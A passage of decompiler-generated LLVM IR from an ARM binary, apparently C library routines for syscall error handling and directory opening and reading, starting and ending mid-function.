  store i32 %v3_12714, i32* %stack_var_-8, align 4
  %v0_12720 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_12720, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12720, -4095
  br i1 %tmp, label %dec_label_pc_12740, label %dec_label_pc_12730

dec_label_pc_12730:                               ; preds = %dec_label_pc_12714
  %v0_12730 = call i32 @function_ce08()
  %v0_12734 = load i32, i32* %r7.global-to-local, align 4
  %v1_12734 = sub i32 0, %v0_12734
  %v2_12738 = inttoptr i32 %v0_12730 to i32*
  store i32 %v1_12734, i32* %v2_12738, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_12740.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_12740

dec_label_pc_12740:                               ; preds = %dec_label_pc_12714, %dec_label_pc_12730
  %v1_12744 = phi i32 [ %v0_12720, %dec_label_pc_12714 ], [ -1, %dec_label_pc_12730 ]
  %v2_12740 = phi i32 [ %v3_12714, %dec_label_pc_12714 ], [ %v2_12740.pre, %dec_label_pc_12730 ]
  store i32 %v2_12740, i32* @r7, align 4
  ret i32 %v1_12744

; uselistorder directives
  uselistorder i32 %v0_12720, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12740, { 1, 0 }
}

define i32 @function_12748(i32 %arg1) local_unnamed_addr {
dec_label_pc_12748:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1274c.outer

dec_label_pc_1274c.outer:                         ; preds = %dec_label_pc_12764, %dec_label_pc_12748
  %v0_1274c.ph = phi i32 [ %v0_1274c.pre.pre, %dec_label_pc_12764 ], [ %arg1, %dec_label_pc_12748 ]
  %tmp = icmp ult i32 %v0_1274c.ph, -4095
  br label %dec_label_pc_1274c

dec_label_pc_1274c:                               ; preds = %dec_label_pc_1274c.outer, %dec_label_pc_1274c
  br i1 %tmp, label %dec_label_pc_1274c, label %dec_label_pc_12764

dec_label_pc_12764:                               ; preds = %dec_label_pc_1274c
  %v0_12764 = call i32 @function_ce08()
  %v1_12768 = sub i32 0, %v0_1274c.ph
  %v2_1276c = inttoptr i32 %v0_12764 to i32*
  store i32 %v1_12768, i32* %v2_1276c, align 4
  %v0_1274c.pre.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1274c.outer

; uselistorder directives
  uselistorder i32 %v0_1274c.ph, { 1, 0 }
  uselistorder label %dec_label_pc_1274c, { 1, 0 }
}

define i32 @function_12774(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_12774:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12774 = load i32, i32* @r7, align 4
  store i32 %v3_12774, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_127a0, label %dec_label_pc_12790

dec_label_pc_12790:                               ; preds = %dec_label_pc_12774
  %v0_12790 = call i32 @function_ce08()
  %v0_12794 = load i32, i32* %r7.global-to-local, align 4
  %v1_12794 = sub i32 0, %v0_12794
  %v2_12798 = inttoptr i32 %v0_12790 to i32*
  store i32 %v1_12794, i32* %v2_12798, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_127a4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_127a0

dec_label_pc_127a0:                               ; preds = %dec_label_pc_12774, %dec_label_pc_12790
  %v2_127a4 = phi i32 [ %v3_12774, %dec_label_pc_12774 ], [ %v2_127a4.pre, %dec_label_pc_12790 ]
  %v0_127a0 = phi i32 [ %arg1, %dec_label_pc_12774 ], [ -1, %dec_label_pc_12790 ]
  store i32 %v2_127a4, i32* @r7, align 4
  ret i32 %v0_127a0

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_127a0, { 1, 0 }
}

define i32 @function_127ac(i32* %arg1) local_unnamed_addr {
dec_label_pc_127ac:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_127ac = load i32, i32* @r4, align 4
  store i32 %v3_127ac, i32* %stack_var_-24, align 4
  %v2_127b0 = load i32, i32* %arg1, align 4
  store i32 %v2_127b0, i32* %r4.global-to-local, align 4
  %v3_127b8 = icmp eq i32 %v2_127b0, -1
  store i32 %tmp, i32* @r7, align 4
  store i32 142044, i32* @r6, align 4
  br i1 %v3_127b8, label %dec_label_pc_127cc, label %dec_label_pc_127e0

dec_label_pc_127cc:                               ; preds = %dec_label_pc_127ac
  %v0_127cc = call i32 @function_ce08()
  store i32 9, i32* %r3.global-to-local, align 4
  %v0_127d4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_127d4, i32* %r2.global-to-local, align 4
  %v2_127d8 = inttoptr i32 %v0_127cc to i32*
  store i32 9, i32* %v2_127d8, align 4
  %v0_12880.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_12880

dec_label_pc_127e0:                               ; preds = %dec_label_pc_127ac
  store i32 36, i32* %r3.global-to-local, align 4
  %v1_127e4 = add i32 %tmp, 24
  store i32 %v1_127e4, i32* %r4.global-to-local, align 4
  store i32 %v1_127e4, i32* %r2.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v4_127f8 = load i32, i32* inttoptr (i32 142120 to i32*), align 8
  call void @__pseudo_branch(i32 %v4_127f8)
  store i32 -1, i32* @r8, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_12810 = load i32, i32* @r6, align 4
  %v2_12810 = add i32 %v0_12810, 16
  %v3_12810 = inttoptr i32 %v2_12810 to i32*
  %v4_12810 = load i32, i32* %v3_12810, align 4
  call void @__pseudo_branch(i32 %v4_12810)
  %v0_1281c = load i32, i32* @r7, align 4
  %v1_1281c = inttoptr i32 %v0_1281c to i32*
  %v2_1281c = load i32, i32* %v1_1281c, align 4
  store i32 %v2_1281c, i32* @r4, align 4
  store i32 24, i32* %r3.global-to-local, align 4
  %v0_1282c = load i32, i32* @r8, align 4
  store i32 %v0_1282c, i32* %v1_1281c, align 4
  %v0_12830 = load i32, i32* @r6, align 4
  %v1_12830 = load i32, i32* %r3.global-to-local, align 4
  %v2_12830 = add i32 %v1_12830, %v0_12830
  %v3_12830 = inttoptr i32 %v2_12830 to i32*
  %v4_12830 = load i32, i32* %v3_12830, align 4
  store i32 ptrtoint (i32* @global_var_1283c.559 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_12830)
  %v0_1283c = load i32, i32* @r7, align 4
  %v1_1283c = add i32 %v0_1283c, 12
  %v2_1283c = inttoptr i32 %v1_1283c to i32*
  %v3_1283c = load i32, i32* %v2_1283c, align 4
  store i32 %v3_1283c, i32* @r0, align 4
  %v0_12840 = call i32 @function_108e4()
  %v0_12844 = load i32, i32* @r7, align 4
  store i32 %v0_12844, i32* @r0, align 4
  %v0_12848 = call i32 @function_108e4()
  %v0_12850 = load i32, i32* @r4, align 4
  %tmp11 = icmp ult i32 %v0_12850, -4095
  br i1 %tmp11, label %dec_label_pc_1287c, label %dec_label_pc_1286c

dec_label_pc_1286c:                               ; preds = %dec_label_pc_127e0
  %v0_1286c = call i32 @function_ce08()
  %v0_12870 = load i32, i32* @r4, align 4
  %v1_12870 = sub i32 0, %v0_12870
  store i32 %v1_12870, i32* %r3.global-to-local, align 4
  %v2_12874 = inttoptr i32 %v0_1286c to i32*
  store i32 %v1_12870, i32* %v2_12874, align 4
  %v0_12878 = load i32, i32* @r8, align 4
  br label %dec_label_pc_1287c

dec_label_pc_1287c:                               ; preds = %dec_label_pc_127e0, %dec_label_pc_1286c
  %v0_1287c = phi i32 [ %v0_12850, %dec_label_pc_127e0 ], [ %v0_12878, %dec_label_pc_1286c ]
  store i32 %v0_1287c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_12880

dec_label_pc_12880:                               ; preds = %dec_label_pc_127cc, %dec_label_pc_1287c
  %v0_12880 = phi i32 [ %v0_12880.pre, %dec_label_pc_127cc ], [ %v0_1287c, %dec_label_pc_1287c ]
  %v2_12888 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_12888, i32* %r4.global-to-local, align 4
  ret i32 %v0_12880

; uselistorder directives
  uselistorder i32 %v0_12850, { 1, 0 }
  uselistorder label %dec_label_pc_12880, { 1, 0 }
  uselistorder label %dec_label_pc_1287c, { 1, 0 }
}

define i32 @function_12894(i32 %arg1) local_unnamed_addr {
dec_label_pc_12894:
  %v0_12894 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_12894, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_12894
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_12894, %bb
  %v10_128a0 = phi i32 [ %arg1, %dec_label_pc_12894 ], [ 0, %bb ]
  ret i32 %v10_128a0

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @function_128a4(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_128a4:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v12_128a4 = load i32, i32* @r7, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg2, i32* @r4, align 4
  %v1_128b8 = call i32 @function_fd60(i32 48)
  %v2_128c0 = icmp eq i32 %v1_128b8, 0
  store i32 add (i32 ptrtoint (i32* @global_var_10210.561 to i32), i32 75980), i32* @r6, align 4
  br i1 %v2_128c0, label %bb, label %dec_label_pc_128d0

bb:                                               ; preds = %dec_label_pc_128a4
  br label %dec_label_pc_1295c

dec_label_pc_128d0:                               ; preds = %dec_label_pc_128a4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_128d4 = load i32, i32* @r4, align 4
  %v2_128d4 = icmp ugt i32 %v0_128d4, 511
  %v2_128d8 = add i32 %v1_128b8, 4
  %v3_128d8 = inttoptr i32 %v2_128d8 to i32*
  store i32 0, i32* %v3_128d8, align 4
  %v0_128dc = load i32, i32* %r3.global-to-local, align 4
  %v2_128dc = add i32 %v1_128b8, 16
  %v3_128dc = inttoptr i32 %v2_128dc to i32*
  store i32 %v0_128dc, i32* %v3_128dc, align 4
  %v0_128e0 = load i32, i32* %r3.global-to-local, align 4
  %v2_128e0 = add i32 %v1_128b8, 8
  %v3_128e0 = inttoptr i32 %v2_128e0 to i32*
  store i32 %v0_128e0, i32* %v3_128e0, align 4
  br i1 %v2_128d4, label %.thread, label %bb16

.thread:                                          ; preds = %dec_label_pc_128d0
  %v0_128e82 = load i32, i32* @r4, align 4
  %v2_128e83 = add i32 %v1_128b8, 20
  %v3_128e84 = inttoptr i32 %v2_128e83 to i32*
  store i32 %v0_128e82, i32* %v3_128e84, align 4
  br label %bb17

bb16:                                             ; preds = %dec_label_pc_128d0
  %v1_128e4 = load i32, i32* %r3.global-to-local, align 4
  %v2_128e4 = add i32 %v1_128e4, 512
  store i32 %v2_128e4, i32* %r3.global-to-local, align 4
  %v0_128e8 = load i32, i32* @r4, align 4
  %v2_128e8 = add i32 %v1_128b8, 20
  %v3_128e8 = inttoptr i32 %v2_128e8 to i32*
  store i32 %v0_128e8, i32* %v3_128e8, align 4
  %v1_128ec = load i32, i32* %r3.global-to-local, align 4
  store i32 %v1_128ec, i32* %v3_128e8, align 4
  br label %bb17

bb17:                                             ; preds = %.thread, %bb16
  store i32 %v1_128b8, i32* @r5, align 4
  %v0_128f4 = load i32, i32* @r7, align 4
  %v2_128f4 = inttoptr i32 %v1_128b8 to i32*
  store i32 %v0_128f4, i32* %v2_128f4, align 4
  %v0_128f8 = load i32, i32* @r5, align 4
  %v1_128f8 = add i32 %v0_128f8, 20
  %v2_128f8 = inttoptr i32 %v1_128f8 to i32*
  %v3_128f8 = load i32, i32* %v2_128f8, align 4
  store i32 %v3_128f8, i32* %r1.global-to-local, align 4
  %v2_12900 = call i32 @function_14de0(i32 1, i32 %v3_128f8)
  %v2_12904 = icmp eq i32 %v2_12900, 0
  store i32 %v2_12900, i32* @r4, align 4
  %v1_1290c = load i32, i32* @r5, align 4
  %v2_1290c = add i32 %v1_1290c, 12
  %v3_1290c = inttoptr i32 %v2_1290c to i32*
  store i32 %v2_12900, i32* %v3_1290c, align 4
  br i1 %v2_12904, label %dec_label_pc_12914, label %dec_label_pc_12924

dec_label_pc_12914:                               ; preds = %bb17
  %v0_12914 = load i32, i32* @r5, align 4
  store i32 %v0_12914, i32* @r0, align 4
  %v0_12918 = call i32 @function_108e4()
  %v0_1291c = load i32, i32* @r4, align 4
  br label %dec_label_pc_1295c

dec_label_pc_12924:                               ; preds = %bb17
  store i32 0, i32* %stack_var_-32, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_1294c = load i32, i32* @r5, align 4
  %v1_1294c = add i32 %v0_1294c, 24
  %v1_12950 = inttoptr i32 %v1_1294c to i32*
  store i32 0, i32* %v1_12950, align 4
  %v3_12950 = add i32 %v0_1294c, 28
  %v4_12950 = inttoptr i32 %v3_12950 to i32*
  %v5_12950 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_12950, i32* %v4_12950, align 4
  %v6_12950 = add i32 %v0_1294c, 32
  %v7_12950 = inttoptr i32 %v6_12950 to i32*
  %v8_12950 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_12950, i32* %v7_12950, align 4
  %v9_12950 = add i32 %v0_1294c, 36
  %v10_12950 = inttoptr i32 %v9_12950 to i32*
  %v11_12950 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v11_12950, i32* %v10_12950, align 4
  %v12_12950 = add i32 %v0_1294c, 40
  %v2_12954 = load i32, i32* %stack_var_-32, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v1_12958 = inttoptr i32 %v12_12950 to i32*
  store i32 %v2_12954, i32* %v1_12958, align 4
  %v3_12958 = add i32 %v0_1294c, 44
  %v4_12958 = inttoptr i32 %v3_12958 to i32*
  %v5_12958 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_12958, i32* %v4_12958, align 4
  %v0_1295c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1295c

dec_label_pc_1295c:                               ; preds = %bb, %dec_label_pc_12914, %dec_label_pc_12924
  %v0_1295c = phi i32 [ 0, %bb ], [ %v0_1291c, %dec_label_pc_12914 ], [ %v0_1295c.pre, %dec_label_pc_12924 ]
  store i32 %v12_128a4, i32* @r7, align 4
  ret i32 %v0_1295c

; uselistorder directives
  uselistorder i32 %v2_12900, { 1, 0, 2 }
  uselistorder i32 %v1_128b8, { 2, 1, 5, 0, 6, 3, 4, 7 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder label %dec_label_pc_1295c, { 2, 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @function_12974(i32 %arg1) local_unnamed_addr {
dec_label_pc_12974:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-104 = alloca i32, align 4
  %v2_1297c = ptrtoint i32* %stack_var_-104 to i32
  store i32 %arg1, i32* @r7, align 4
  %tmp7 = icmp ult i32 %arg1, -4095
  br i1 %tmp7, label %dec_label_pc_129a4, label %dec_label_pc_12994

dec_label_pc_12994:                               ; preds = %dec_label_pc_12974
  %v0_12994 = call i32 @function_ce08()
  %v0_12998 = load i32, i32* @r7, align 4
  %v1_12998 = sub i32 0, %v0_12998
  %v2_1299c = inttoptr i32 %v0_12994 to i32*
  store i32 %v1_12998, i32* %v2_1299c, align 4
  br label %dec_label_pc_129c8

dec_label_pc_129a4:                               ; preds = %dec_label_pc_12974
  %v1_129a4 = icmp slt i32 %arg1, 0
  br i1 %v1_129a4, label %dec_label_pc_129c8, label %dec_label_pc_129ac

dec_label_pc_129ac:                               ; preds = %dec_label_pc_129a4
  store i32 %v2_1297c, i32* @r1, align 4
  %v0_129b0 = call i32 @function_153ac()
  %v1_129b4 = icmp slt i32 %v0_129b0, 0
  br i1 %v1_129b4, label %dec_label_pc_129bc, label %dec_label_pc_129d0

dec_label_pc_129bc:                               ; preds = %dec_label_pc_129ac
  br label %dec_label_pc_129c8

dec_label_pc_129c8:                               ; preds = %dec_label_pc_129bc, %dec_label_pc_129a4, %dec_label_pc_12994
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12a0c

dec_label_pc_129d0:                               ; preds = %dec_label_pc_129ac
  %v0_129d8 = load i32, i32* @r7, align 4
  %v3_129dc = call i32 @function_12640(i32 %v0_129d8, i32 2, i32 1)
  %v0_129e0 = load i32, i32* @r7, align 4
  %v2_129e8 = call i32 @function_128a4(i32 %v0_129e0, i32 %tmp)
  store i32 %v2_129e8, i32* %r4.global-to-local, align 4
  %v2_129ec = icmp eq i32 %v2_129e8, 0
  br i1 %v2_129ec, label %dec_label_pc_129f4, label %dec_label_pc_12a0c

dec_label_pc_129f4:                               ; preds = %dec_label_pc_129d0
  %v0_12a00 = call i32 @function_ce08()
  %v2_12a08 = inttoptr i32 %v0_12a00 to i32*
  store i32 12, i32* %v2_12a08, align 4
  %v0_12a0c.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12a0c

dec_label_pc_12a0c:                               ; preds = %dec_label_pc_129d0, %dec_label_pc_129c8, %dec_label_pc_129f4
  %v0_12a0c = phi i32 [ %v2_129e8, %dec_label_pc_129d0 ], [ 0, %dec_label_pc_129c8 ], [ %v0_12a0c.pre, %dec_label_pc_129f4 ]
  ret i32 %v0_12a0c

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_12a0c, { 2, 0, 1 }
}

define i32 @function_12a1c(i32 %arg1) local_unnamed_addr {
dec_label_pc_12a1c:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-104 = alloca i32, align 4
  %v0_12a1c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_12a1c, label %bb, label %dec_label_pc_12a1c._crit_edge

dec_label_pc_12a1c._crit_edge:                    ; preds = %dec_label_pc_12a1c
  br label %bb11

bb:                                               ; preds = %dec_label_pc_12a1c
  br label %bb11

bb11:                                             ; preds = %dec_label_pc_12a1c._crit_edge, %bb
  %v2_12a24 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_12a24, i32* @r1, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_12a30 = call i32 @function_153ac()
  store i32 %v0_12a30, i32* @r5, align 4
  %v2_12a34 = icmp eq i32 %v0_12a30, 0
  br i1 %v2_12a34, label %dec_label_pc_12a3c, label %dec_label_pc_12aa4

dec_label_pc_12a3c:                               ; preds = %bb11
  %v1_12a40 = and i32 %tmp5, 61440
  store i32 %v1_12a40, i32* @r3, align 4
  %v7_12a44 = icmp eq i32 %v1_12a40, 16384
  br i1 %v7_12a44, label %dec_label_pc_12a5c, label %dec_label_pc_12a4c

dec_label_pc_12a4c:                               ; preds = %dec_label_pc_12a3c
  %v0_12a4c = call i32 @function_ce08()
  br label %dec_label_pc_12a88

dec_label_pc_12a5c:                               ; preds = %dec_label_pc_12a3c
  %v0_12a5c = load i32, i32* @r4, align 4
  %v2_12a64 = call i32 @function_125d4(i32 %v0_12a5c, i32 3)
  %v7_12a68 = icmp eq i32 %v2_12a64, -1
  br i1 %v7_12a68, label %dec_label_pc_12aa4, label %dec_label_pc_12a70

dec_label_pc_12a70:                               ; preds = %dec_label_pc_12a5c
  %v1_12a70 = urem i32 %v2_12a64, 4
  %v7_12a74 = icmp eq i32 %v1_12a70, 1
  br i1 %v7_12a74, label %dec_label_pc_12a7c, label %dec_label_pc_12a90

dec_label_pc_12a7c:                               ; preds = %dec_label_pc_12a70
  %v0_12a7c = call i32 @function_ce08()
  br label %dec_label_pc_12a88

dec_label_pc_12a88:                               ; preds = %dec_label_pc_12a4c, %dec_label_pc_12a7c
  %storemerge2 = phi i32 [ %v0_12a4c, %dec_label_pc_12a4c ], [ %v0_12a7c, %dec_label_pc_12a7c ]
  %storemerge = phi i32 [ 20, %dec_label_pc_12a4c ], [ 22, %dec_label_pc_12a7c ]
  %storemerge1 = load i32, i32* @r5, align 4
  store i32 %storemerge1, i32* %r2.global-to-local, align 4
  %v2_12a88 = inttoptr i32 %storemerge2 to i32*
  store i32 %storemerge, i32* %v2_12a88, align 4
  %v0_12aa8.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_12aa8

dec_label_pc_12a90:                               ; preds = %dec_label_pc_12a70
  %v0_12a90 = load i32, i32* @r4, align 4
  %v2_12a98 = call i32 @function_128a4(i32 %v0_12a90, i32 %tmp)
  store i32 %v2_12a98, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_12aa8

dec_label_pc_12aa4:                               ; preds = %bb11, %dec_label_pc_12a5c
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_12aa8

dec_label_pc_12aa8:                               ; preds = %dec_label_pc_12a90, %dec_label_pc_12a88, %dec_label_pc_12aa4
  %v0_12aa8 = phi i32 [ %v2_12a98, %dec_label_pc_12a90 ], [ %v0_12aa8.pre, %dec_label_pc_12a88 ], [ 0, %dec_label_pc_12aa4 ]
  ret i32 %v0_12aa8

; uselistorder directives
  uselistorder i32 %v2_12a64, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32 (i32, i32)* @function_128a4, { 1, 0 }
  uselistorder i32 16384, { 1, 0, 2 }
  uselistorder i32 ()* @function_153ac, { 1, 0 }
  uselistorder label %dec_label_pc_12aa8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12aa4, { 1, 0 }
  uselistorder label %dec_label_pc_12a88, { 1, 0 }
  uselistorder label %bb11, { 1, 0 }
}

define i32 @function_12ab8(i32* %arg1) local_unnamed_addr {
dec_label_pc_12ab8:
  %ip.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 142044, i32* @r6, align 4
  %v1_12acc = add i32 %tmp, 24
  store i32 %v1_12acc, i32* @r4, align 4
  store i32 %tmp, i32* @r5, align 4
  %v4_12ae4 = load i32, i32* inttoptr (i32 142120 to i32*), align 8
  store i32 %v4_12ae4, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_12ae4)
  %v0_12af8 = load i32, i32* @r6, align 4
  %v2_12af8 = add i32 %v0_12af8, 16
  %v3_12af8 = inttoptr i32 %v2_12af8 to i32*
  %v4_12af8 = load i32, i32* %v3_12af8, align 4
  store i32 %v4_12af8, i32* %ip.global-to-local, align 4
  store i32 76548, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_12af8)
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_12b08

dec_label_pc_12b08:                               ; preds = %dec_label_pc_12b38, %dec_label_pc_12ab8
  %v0_12b08 = load i32, i32* @r5, align 4
  %v1_12b08 = add i32 %v0_12b08, 4
  %v2_12b08 = inttoptr i32 %v1_12b08 to i32*
  %v3_12b08 = load i32, i32* %v2_12b08, align 4
  %v4_12b08 = add i32 %v0_12b08, 8
  %v5_12b08 = inttoptr i32 %v4_12b08 to i32*
  %v6_12b08 = load i32, i32* %v5_12b08, align 4
  %tmp10 = icmp ugt i32 %v6_12b08, %v3_12b08
  br i1 %tmp10, label %dec_label_pc_12b38, label %dec_label_pc_12b14

dec_label_pc_12b14:                               ; preds = %dec_label_pc_12b08
  %v1_12b14 = inttoptr i32 %v0_12b08 to i32*
  %v2_12b14 = load i32, i32* %v1_12b14, align 4
  %v1_12b18 = add i32 %v0_12b08, 12
  %v2_12b18 = inttoptr i32 %v1_12b18 to i32*
  %v3_12b18 = load i32, i32* %v2_12b18, align 4
  %v1_12b1c = add i32 %v0_12b08, 20
  %v2_12b1c = inttoptr i32 %v1_12b1c to i32*
  %v3_12b1c = load i32, i32* %v2_12b1c, align 4
  %v4_12b20 = inttoptr i32 %v3_12b18 to i32*
  %v5_12b20 = call i32 @function_15674(i32 %v2_12b14, i32* %v4_12b20, i32 %v3_12b1c, i32 %v6_12b08)
  %tmp9 = icmp slt i32 %v5_12b20, 1
  br i1 %tmp9, label %.thread, label %dec_label_pc_12b30

.thread:                                          ; preds = %dec_label_pc_12b14
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_12b68

dec_label_pc_12b30:                               ; preds = %dec_label_pc_12b14
  %v1_12b30 = load i32, i32* @r5, align 4
  %v2_12b30 = add i32 %v1_12b30, 8
  %v3_12b30 = inttoptr i32 %v2_12b30 to i32*
  store i32 %v5_12b20, i32* %v3_12b30, align 4
  %v0_12b34 = load i32, i32* @r7, align 4
  %v1_12b34 = load i32, i32* @r5, align 4
  %v2_12b34 = add i32 %v1_12b34, 4
  %v3_12b34 = inttoptr i32 %v2_12b34 to i32*
  store i32 %v0_12b34, i32* %v3_12b34, align 4
  %v0_12b38.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_12b38

dec_label_pc_12b38:                               ; preds = %dec_label_pc_12b08, %dec_label_pc_12b30
  %v1_12b5c = phi i32 [ %v0_12b08, %dec_label_pc_12b08 ], [ %v0_12b38.pre, %dec_label_pc_12b30 ]
  %v1_12b38 = add i32 %v1_12b5c, 4
  %v2_12b38 = inttoptr i32 %v1_12b38 to i32*
  %v3_12b38 = load i32, i32* %v2_12b38, align 4
  %v1_12b3c = add i32 %v1_12b5c, 12
  %v2_12b3c = inttoptr i32 %v1_12b3c to i32*
  %v3_12b3c = load i32, i32* %v2_12b3c, align 4
  %v2_12b40 = add i32 %v3_12b3c, %v3_12b38
  store i32 %v2_12b40, i32* @r4, align 4
  %v3_12b44 = inttoptr i32 %v2_12b40 to i32*
  %v4_12b44 = load i32, i32* %v3_12b44, align 4
  %v1_12b48 = add i32 %v2_12b40, 4
  %v2_12b48 = inttoptr i32 %v1_12b48 to i32*
  %v3_12b48 = load i32, i32* %v2_12b48, align 4
  %v1_12b4c = add i32 %v2_12b40, 16
  %v2_12b4c = inttoptr i32 %v1_12b4c to i16*
  %v3_12b4c = load i16, i16* %v2_12b4c, align 2
  %v4_12b4c = zext i16 %v3_12b4c to i32
  %v1_12b50 = add i32 %v2_12b40, 8
  %v2_12b50 = inttoptr i32 %v1_12b50 to i32*
  %v3_12b50 = load i32, i32* %v2_12b50, align 4
  store i32 %v3_12b50, i32* %ip.global-to-local, align 4
  %v2_12b54 = add i32 %v4_12b4c, %v3_12b38
  %v2_12b58 = or i32 %v3_12b48, %v4_12b44
  %v4_12b58 = icmp eq i32 %v2_12b58, 0
  store i32 %v2_12b54, i32* %v2_12b38, align 4
  %v0_12b60 = load i32, i32* %ip.global-to-local, align 4
  %v1_12b60 = load i32, i32* @r5, align 4
  %v2_12b60 = add i32 %v1_12b60, 16
  %v3_12b60 = inttoptr i32 %v2_12b60 to i32*
  store i32 %v0_12b60, i32* %v3_12b60, align 4
  br i1 %v4_12b58, label %dec_label_pc_12b08, label %dec_label_pc_12b68

dec_label_pc_12b68:                               ; preds = %dec_label_pc_12b38, %.thread
  %v0_12b74 = load i32, i32* @r6, align 4
  %v2_12b74 = add i32 %v0_12b74, 24
  %v3_12b74 = inttoptr i32 %v2_12b74 to i32*
  %v4_12b74 = load i32, i32* %v3_12b74, align 4
  store i32 %v4_12b74, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_12b74)
  %v0_12b80 = load i32, i32* @r4, align 4
  ret i32 %v0_12b80

; uselistorder directives
  uselistorder i32 %v2_12b40, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v1_12b5c, { 1, 0 }
  uselistorder i32 %v6_12b08, { 1, 0 }
  uselistorder i32 %v0_12b08, { 0, 1, 3, 2, 4, 5 }
  uselistorder label %dec_label_pc_12b38, { 1, 0 }
}

define i32 @function_12b94(i32 %arg1) local_unnamed_addr {
dec_label_pc_12b94:
  %v0_12b94 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_12b94, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_12b94
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_12b94, %bb
  %v10_12ba0 = phi i32 [ %arg1, %dec_label_pc_12b94 ], [ 0, %bb ]
  ret i32 %v10_12ba0

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @function_12ba4() local_unnamed_addr {
dec_label_pc_12ba4:
  ret i32 ptrtoint (i32* @global_var_254d8.577 to i32)
}

define i32 @function_12bc0(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_12bc0:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %v3_12bc0 = load i32, i32* @r4, align 4
  %v6_12bc0 = load i32, i32* @r5, align 4
